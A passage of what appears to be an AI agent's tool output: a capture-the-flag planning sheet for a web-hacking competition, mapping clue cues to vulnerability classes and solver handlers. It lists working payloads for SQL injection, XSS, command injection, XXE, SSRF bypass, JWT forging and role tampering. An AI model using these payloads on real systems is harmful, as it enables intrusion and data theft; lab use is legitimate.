rization is merely a suggestion\", clues `inventory_route` + `protected_reference`, 403 `field_action_forbidden` | GET inventory -> every single field x action on the protected id | done; Mastery |\n| 39 | improper API inventory: shadow / old version / beta / debug endpoint without the check (API9) | gap | `/api/v1` vs `/v2`, `version`/`deprecated` keys in inventory or openapi, `X-API-Version`, \"legacy\", \"beta\", \"old docs\" | list every documented + version-swapped path, call the protected op on each | high |\n| 40 | unrestricted resource consumption / pagination over-read (API4) | gap | `limit`/`page_size`/`per_page`, \"only shows 10\", rate-limit headers | `limit=100000`, `page=-1`, `per_page=0`, offset past the public window | med |\n\n## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /api/clues   -> feature_route / secondary_route / current_role + ZERO or ONE concept key\n  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,\n      browser_callback_required, post_required(405) = a POST sink, administrator_required(403) = privilege check)\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). An `effect` without the proof is NOT a solve.\n  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.\nPick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the\nvalue (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\nNo concept key (D11-D13, D15) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\nMASTERY: 3-4 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n  \"obeys whoever asks nicely -- even strangers\"             cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ninventory_route + protected_reference, \"take inventory  -> field/action authz -> GET inventory; feature?id=<protected>&fields=<f>&action=<a> for\n  ... every field, every function\", field_action_forbidden    (D14)                 EVERY single f x a (lists / * are forbidden) -> evidence\n\"fetch anything you point it at\", \"internal service\",  -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; port 80/localhost =\n  feature absolute_url_required, secondary internal_only                       fetch_failed -> ladder :8080 :80 :5000 :8000 :3000; param from error\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\nSSRF filtered (blocked_host / scheme_not_allowed)      -> SSRF sequel        -> 2130706433, 127.1, [::1], 0.0.0.0, allowed@127.0.0.1, file:///run/...\n/api/v1 vs /v2, \"legacy\", \"beta\", deprecated in docs  -> shadow API (API9)  -> the protected op on every version-swapped / undocumented path\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\nA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\ncan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\nmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\ndid -> TT first try; D09, D10, D12, D13, D15 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane, no `web:*` keys in\n.run/prebuild-state.json). Dropped after D13: `ssti-engine-probe` (seen D11), `port-day22-handlers`. Dropped after\nD15: `ssrf-planner` (seen D15; replaced by `ssrf-filter-bypass`); D14's inventory field x action read folded into\n`bopla-field-read` (now the no-inventory sibling). Added after D15: `ssrf-filter-bypass`, `api-shadow-version`,\n`api-resource-limit-overread`, `api-unsafe-consumption`.\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D15 (hctf/prebuild.py has no `web` string at all): hctf/prebuild.py LANES has no `web` entry (AUTO_LANES lists 5 lanes) and .run/prebuild-state.json has no web:* keys, so no prebuild gap below can drain. lib/web/handlers/ already loads per-day plugins `dayNN_*.py` exporting KEY_MAP + HANDLERS (D23 added three) -> the writable target is a new plugin file per gap, e.g. lib/web/handlers/prebuilt_<id>.py, + tests/data/web_fixtures/. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web/handlers/prebuilt_, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web/handlers/__init__.py:_load_plugins,)}`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D15 repeated it: Fetch Quest TT started 13:18:04Z, ~5 s after single CORRECT, and the codify worker's lib/web/handlers/day24_web_fetch_quest.py landed ~1 min later -> TT solver_incomplete 41 s, live worker hand-solved. Same on D12/D13 (41 s, 12.9 s). D11 (plugin written before submit) and D14 went first try. Owner of hctf/ + web skill: for web, gate TT start on the codify worker (or on solver-test passing the single case), and tell the single worker to write the plugin handler (KEY_MAP + HANDLERS, generic over param/field/route words) before `hctf submit`.\"},\n  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON (still on D14/D15) shows current_role: analyst; D13 granted admin via JSON body binding (mass assignment, seen) -- the sibling forms are untested. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|administrator|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role=admin / ?admin=1, PATCH/PUT of the profile route with the D13 privilege key set. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py. D14: inventory_route + protected_reference -> fetch inventory JSON {route, query_parameters, fields, actions, public_reference} and enumerate field x action on the protected id (error id_fields_action_required / field_action_forbidden) -- plugin day24_web_the_api_has_opinions.py. D15 (no concept key): feature 400 absolute_url_required + secondary 403 internal_only -> SSRF (feature?url=http://127.0.0.1:8080<secondary>) -- plugin day24_web_fetch_quest.py; error fetch_failed = wrong host/port, keep laddering.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web/ (package; see lib/web/__init__.py): concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board)","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false,"persistedOutputPath":"/home/testpwn/.claude/projects/-home-testpwn-huntress-2026/2f22de87-85c6-4735-9cd3-ecbd50af08de/tool-results/bekevwamy.txt","persistedOutputSize":45484},"tool_result_meta":[{"id":"toolu_01QWsxpe8W9rQzUJB1hgtyR4","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
